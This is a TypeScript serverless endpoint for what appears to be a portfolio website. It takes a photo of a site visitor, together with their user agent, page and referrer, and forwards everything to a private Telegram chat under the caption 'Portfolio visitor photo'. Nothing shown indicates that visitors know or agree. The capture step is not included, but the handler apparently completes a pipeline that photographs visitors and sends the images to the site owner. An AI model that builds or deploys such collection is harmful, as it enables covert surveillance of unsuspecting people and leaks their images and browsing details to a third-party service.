import type { VercelRequest, VercelResponse } from "@vercel/node";

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ error: "Telegram environment variables are not configured" });
  }

  try {
    const { image, userAgent, page, referrer } = req.body ?? {};
    if (typeof image !== "string" || !image.startsWith("data:image/")) {
      return res.status(400).json({ error: "Invalid image" });
    }

    const base64 = image.split(",")[1];
    if (!base64) return res.status(400).json({ error: "Invalid image data" });

    const bytes = Buffer.from(base64, "base64");
    if (bytes.byteLength > 8 * 1024 * 1024) {
      return res.status(413).json({ error: "Image too large" });
    }

    const form = new FormData();
    form.append("chat_id", chatId);
    form.append(
      "caption",
      [
        "📸 Portfolio visitor photo",
        `🕐 ${new Date().toISOString()}`,
        `📄 ${String(page ?? "/")}`,
        `🔗 ${String(referrer ?? "Direct")}`,
        `💻 ${String(userAgent ?? "Unknown").slice(0, 500)}`,
      ].join("\n"),
    );
    form.append("photo", new Blob([bytes], { type: "image/jpeg" }), "visitor.jpg");

    const telegram = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
      method: "POST",
      body: form,
    });

    if (!telegram.ok) {
      return res.status(502).json({ error: "Telegram request failed" });
    }

    return res.status(200).json({ ok: true });
  } catch {
    return res.status(500).json({ error: "Unexpected server error" });
  }
}
